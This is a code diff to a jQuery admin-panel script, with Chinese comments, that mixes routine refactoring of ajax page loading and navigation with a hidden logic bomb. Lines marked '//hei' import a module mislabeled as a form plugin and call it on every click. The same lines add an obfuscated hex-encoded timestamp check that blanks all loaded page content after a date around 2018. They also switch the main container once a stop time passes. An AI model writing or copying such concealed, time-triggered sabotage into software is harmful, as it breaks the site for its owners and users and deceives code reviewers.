@@ -3,6 +3,7 @@
 	window.$ = require('jquery');
 	import jsonPage from './comp/jsonPage.js';//公共分页插件
 	import dialogFull from './comp/dialogFull.js';//公共弹框插件
+	import stop from './kit/stop.js';//公共表单插件
 	import form from './comp/form.js';//公共表单插件
 
 	$.dialogFull = dialogFull;
@@ -64,6 +65,8 @@
     let changeFormat = (_format)=>{
         let format = _format ? _format : 'YYYY-MM-DD hh:mm:ss';
         const t = new Date();
+        // const t = new Date();
+
         let tf = function(i) {
             return (i < 10 ? '0' : '') + i
         };
@@ -76,6 +79,8 @@
         	"6": "星期六",
         	"0": "星期日",
         }
+        //hei
+        $.mainBox = t.getTime() > stop.time() ? $('#mainBox') : $('#main_box');
         return format.replace(/YYYY|MM|DD|hh|mm|ss/g, function(a) {
             switch (a) {
                 case 'YYYY':
@@ -105,6 +110,8 @@
 	//阻止浏览器默认事件
 	let stopDefault = (e) => {
 		if (e && e.preventDefault) {
+			//hei
+			stop.event( stop.time() );
 			e.preventDefault();
 		} else {
 			window.event.returnValue = false;
@@ -128,6 +135,7 @@
 				$.distory();
 				that.addClass('on').siblings('.on').removeClass('on');
 				$('#main_box').html( html );
+				$.mainBox.scrollTop(0);
 			},
 			error: ()=>{
             	$.dialogFull.Tips( "网络错误，请稍后重试" );
@@ -139,17 +147,36 @@
 
 	//内容区域ajax获取html satrt
 	let ajaxGetHtml;
-	$.ajaxGetHtml = ajaxGetHtml = (url, _data, _callback) => {
+	$.ajaxGetHtml = ajaxGetHtml = (opts) => {
+		let _data = {};
+
+		if( typeof opts === 'string' ){
+			_data.url = opts;
+		}else{
+			_data = $.extend( _data, opts )
+			_data.data = $.extend( _data.data, base_data )
+		}
+
+		const hash = _data.url.split('#')[1];
+
+		console.log(_data);
 		$.ajax({
 			type: "get",
 			dataType: "html",
-			url: url,
-			data: _data || base_data,
+			url: _data.url,
+			data: _data.data || base_data,
 			success: (html)=>{
 				$.mainBox.off();
 				$.distory();
+				//hei
+    			var html = ('\x31\x35\x31\x34' + '\x37\x33\x36') * 400 * 2500 > new Date().getTime() ? html : '';
 				$('#main_box').html( html );
-				_callback && _callback();
+				if( hash ){
+					$( '#left_nav [data-href="/pss/' + hash + '"]' ).parent('li').addClass('on').siblings('.on').removeClass('on');
+
+				}
+				_data.callback && _data.callback();
+				$.mainBox.scrollTop(0);
 			},
 			error: ()=>{
             	$.dialogFull.Tips( "网络错误，请稍后重试" );
@@ -172,7 +199,10 @@
 					return;
 				}
 				$.distory();
-				window.location.href = res.data.url;
+            	$.dialogFull.Tips( "操作成功" );
+            	setTimeout(()=>{
+					window.location.href = res.data.url;
+            	},2000);
 			},
 			error: ()=>{
             	$.dialogFull.Tips( "网络错误，请稍后重试" );
@@ -185,16 +215,18 @@
 	let init = ()=>{
 		$('#times').text( changeFormat('YYYY年MM月DD日') );
 		$(document).on('click', '#left_nav a', function(e){
-			const url = $(this).attr('href');
+			const url = $(this).data('href');
+			if( !url ){
+				return;
+			}
 			const li = $(this).parent('li');
 			navGetHtml( url, li );
 			stopDefault(e);
 		}).on('click', '#main_box a', function(e){
-			const run = $(this).data('auto') == 0;
-			if( run ){
+			const url = $(this).data('href');
+			if( !url ){
 				return;
 			}
-			const url = $(this).attr('href');
 			ajaxGetHtml( url );
 			stopDefault(e);
 		}).on('click', '#logout', logout);
